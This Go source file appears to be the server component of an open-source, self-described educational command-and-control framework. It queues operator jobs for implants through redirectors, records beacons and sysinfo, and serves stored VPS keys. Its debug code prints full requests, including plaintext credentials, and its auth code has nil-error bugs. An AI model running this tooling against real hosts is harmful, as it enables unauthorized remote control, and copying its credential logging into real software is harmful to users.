//{{{{{{{ Hive Roaster Functions }}}}}}}

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (

	"fmt"
	"time"
    "github.com/gorilla/mux"
    "net/http"
    "crypto/tls"
    "encoding/json"
    "bytes"
    "net/http/httputil"
    "strings"
    "sync"
)

//Auth JSON, for encoded auth bearer for users and redirectors
type UserAuth struct {
    Username string  `json:"username"`  
    Password string  `json:"password"`
}

type RedAuth struct {
    Domain string   `json:"domain"`
    Token string  `json:"token"`  
}

// This will hold on-wait Jobs to be processed
type JobsToProcess struct {
    mux  sync.RWMutex
    Jobs []*Job
}
var jobsToProcess *JobsToProcess


func startRoaster(){
    
    //Initialize on memory slices for redirect Jobs
    var jobs []*Job
    jobsToProcess = &JobsToProcess{Jobs:jobs}

    router := mux.NewRouter()
    router.Use(commonMiddleware)

    //Hive Servlet - Users
    router.HandleFunc("/client", GetUser).Methods("GET")
    router.HandleFunc("/vpskey", GetVpsKey).Methods("GET")
    router.HandleFunc("/report", GetReport).Methods("GET")
    router.HandleFunc("/client", PostUser).Methods("POST")

    //Hive Servlet - Redirectors
    router.HandleFunc("/red", GetRed).Methods("GET")
    router.HandleFunc("/red", PostRed).Methods("POST")
    router.HandleFunc("/checking", CheckingRed).Methods("GET")

    //TLS configurations
    cfg := &tls.Config{
        MinVersion:               tls.VersionTLS12,
        CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
        PreferServerCipherSuites: true,
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
            tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
        },
    }
    srv := &http.Server{
        Addr:         roasterString,
        Handler:      router,
        TLSConfig:    cfg,
        TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
    }

    err := srv.ListenAndServeTLS("./certs/hive.pem","./certs/hive.key")
    if err != nil {
    	//ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("%s%s","Network(Roaster Starting Error):",err.Error())
		addLogDB("Hive",time,elog)
    }
}

func commonMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Add("Content-Type", "application/json")
        next.ServeHTTP(w, r)
    })
}


////Users' Servlet

// This will give back to GUI the data from the sqlite DB
func GetUser(w http.ResponseWriter, r *http.Request) {
    

    //Do auth flow, get CID if valid
    cid := userAuth(r.Header.Get("Authorization"))
    if cid == "Bad"{    
        return
    }

    err,db := getGUIDataDB()
    if err != nil {
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("%s%s","Error Extracting GUI DB:",err.Error())
		addLogDB("Hive",time,elog)
		return
    }

    json.NewEncoder(w).Encode(db)
}


// Give back pem key
func GetVpsKey(w http.ResponseWriter, r *http.Request) {
    

    //Do auth flow, get CID if valid
    cid := userAuth(r.Header.Get("Authorization"))
    if cid == "Bad"{    
        return
    }

    keys, ok := r.URL.Query()["vpsname"]
    
    if !ok || len(keys[0]) < 1 {
        //ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        addLogDB("Hive",time,"Bad GetKey Get Query from:"+cid)
        return
    }


    key,err := getVpsPemDB(keys[0])
    if err != nil {
        //ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        addLogDB("Hive",time,"Bad GetKey Get Query from:"+cid)
        return
    }
    
    fmt.Fprint(w, key)
    return
}


// Give back pem key
func GetReport(w http.ResponseWriter, r *http.Request) {
    

    //Do auth flow, get CID if valid
    cid := userAuth(r.Header.Get("Authorization"))
    if cid == "Bad"{    
        return
    }

    keys, ok := r.URL.Query()["reportname"]
    
    if !ok || len(keys[0]) < 1 {
        //ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        addLogDB("Hive",time,"Bad GetKey Get Query from:"+cid)
        return
    }


    err,rbody := getReportBodyDB(keys[0])
    if err != nil {
        //ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        addLogDB("Hive",time,"Bad GetKey Get Query from:"+cid)
        return
    }
    
    fmt.Println("Report:"+rbody)
    fmt.Println("Report1:"+keys[0])
    fmt.Fprint(w, rbody)
    return
}

// This will let the GUI to send Jobs to Hive
func PostUser(w http.ResponseWriter, r *http.Request) {

    //Do auth flow, get CID if valid
    cid := userAuth(r.Header.Get("Authorization"))
    if cid == "Bad"{    
        return
    }

    decoder := json.NewDecoder(r.Body)
    var job *Job
    err := decoder.Decode(&job)
    if err != nil {
    	//ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("%s%s","Jobs(Error Decoding User Job):",err.Error())
		addLogDB("Hive",time,elog)
		return
    }

    job.Cid = cid
    //If it targets a bichito;Set RID to target Job, in function of the last RID assigned to the Bot
    if !strings.Contains(job.Pid,"Hive"){
        job.Pid,_ = getRidbyBid(job.Chid)
    }
	
    //check redundant Jid
    errJ := addJobDB(job)
    if errJ != nil {
    	//ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("%s%s","Jobs(Job Already Processed):",err.Error())
		addLogDB("Hive",time,elog)
		return
    }
    setJobStatusDB(job.Jid,"Processing")
    go jobProcessor(job)

    //Debug
    requestDump, err2 := httputil.DumpRequest(r, true)
    if err2 != nil {
        fmt.Println(err2)
    }
    fmt.Println(string(requestDump))
}

// Check Authorization header for a JSON encoded object:
// Authorization: JSON{username,password}
// If valid, get back user CID

func userAuth(authbearer string) string{

    //Decode auth bearer
    var userauth *UserAuth
    decoder := json.NewDecoder(bytes.NewBufferString(authbearer))
    errD := decoder.Decode(&userauth)
    if errD != nil{
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        elog := fmt.Sprintf("%s%s","User Auth(Bad Encoding):",errD.Error())
        addLogDB("Hive",time,elog)     
        return "Bad"
    }
    //Check DB username/hash,generate token, and on memory user data
    cid,err := getCidbyAuthDB(userauth.Username,userauth.Password)
    if err != nil{
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        elog := fmt.Sprintf("%s%s","User Auth(Bad Username/pwd):",err.Error())
        addLogDB("Hive",time,elog)     
        return "Bad"
    }
    return cid
}


////Redirector's Servlet

//Retrieve all the Jobs that need to be sent to the requester redirector
func GetRed(w http.ResponseWriter, r *http.Request) {
    
    //Auth
    domain := redAuth(r.Header.Get("Authorization"))
    if domain == "Bad"{
        return
    }   

    rid,_ := getRedRidbyDomain(domain)

    //Debug
    requestDump, err2 := httputil.DumpRequest(r, true)
    if err2 != nil {
        fmt.Println(err2)
    }
    fmt.Println(string(requestDump))

    json.NewEncoder(w).Encode(getRedJobs(rid))
}

//Loop over job array and select the ones that has Rid + Bid connected
func getRedJobs(rid string) []*Job{
	var result []*Job

    //Lock shared Slice
    jobsToProcess.mux.Lock()
    defer jobsToProcess.mux.Unlock()

    j := 0
    for i,_ := range jobsToProcess.Jobs {
        if jobsToProcess.Jobs[i].Pid == rid{
            result = append(result,jobsToProcess.Jobs[i])
            
        }else{
            jobsToProcess.Jobs[j] = jobsToProcess.Jobs[i]
            j++
        }
    }
    jobsToProcess.Jobs = jobsToProcess.Jobs[:j]


    return result
}


//Redirector posting the jobs they have finished/unfinished
func PostRed(w http.ResponseWriter, r *http.Request) {

    //Debug
    requestDump, err3 := httputil.DumpRequest(r, true)
    if err3 != nil {
        fmt.Println(err3)
    }
    fmt.Println(string(requestDump))

    //Auth
    domain := redAuth(r.Header.Get("Authorization"))
    if domain == "Bad"{
        return
    }  


    decoder := json.NewDecoder(r.Body)
    var job *Job
    err := decoder.Decode(&job)
    if err != nil {
    	//ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("%s%s","Jobs(Error Decoding Redirector Job):",err.Error())
		addLogDB("Hive",time,elog)
		return
    }


    //These jobs are generated by the Redirectors/Implants themselve for logging, beaconing back, etc...
    if job.Job == "BiChecking"{  	
    	go jobProcessor(job)
    	return
    }

    if job.Job == "log"{  	
    	go jobProcessor(job)
    	return
    }

    if job.Job == "BiPing"{  	
    	go jobProcessor(job)
    	return
    }

    if (job.Job == "sysinfo") && (job.Status == "Success") {      
        
        //Update Bid Info
        setBiInfoDB(job.Chid,job.Result)
    } 

    //These jobs are the ones generated by Users, that came back to be updated with results
    err2 := updateJobDB(job)
    if err2 != nil {
    	//ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("Job "+job.Jid+"(Not existent or already Finished,Possible Replay attack/Problem):"+err2.Error())
		addLogDB("Hive",time,elog)
		return
    }

    //Update Last Actives and Redirectors/Bichitos if PiggyBAcking Job is correct
    time := time.Now().Format("02/01/2006 15:04:05 MST")
    setRedLastCheckedDB(job.Pid,time)
    setBiLastCheckedbyBidDB(job.Chid,time)
    setBiRidDB(job.Chid,job.Pid)

    return
}

func CheckingRed(w http.ResponseWriter, r *http.Request) {
    
    //Auth
    domain := redAuth(r.Header.Get("Authorization"))
    if domain == "Bad"{
        return
    }   

    rid,err := getRedRidbyDomain(domain)
    if err != nil {
        //ErrorLog
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        elog := fmt.Sprintf("%s%s","Error Getting Rid of domain:"+domain,err.Error())
        addLogDB("Hive",time,elog)
        return
    }
    fmt.Fprint(w, rid)
    return
}

// Check Authorization header for a JSON encoded object:
// Authorization: JSON{domain,token}
// If a valid token, process, if not drop connection and log

func redAuth(authbearer string) string{

    var redauth *RedAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authbearer))
    err := decoder.Decode(&redauth)

    err,token := getDomainTokenDB(redauth.Domain)
    if err != nil{
        time := time.Now().Format("02/01/2006 15:04:05 MST")
        elog := fmt.Sprintf("%s%s","Red Auth(Bad domain):",err.Error())
        addLogDB("Hive",time,elog)
        return "Bad"
    }

    if redauth.Token == token{
        return redauth.Domain
    }

    time := time.Now().Format("02/01/2006 15:04:05 MST")
    elog := fmt.Sprintf("%s%s","Red Auth(Bad token):",err.Error())
    addLogDB("Hive",time,elog)
    return "Bad"

}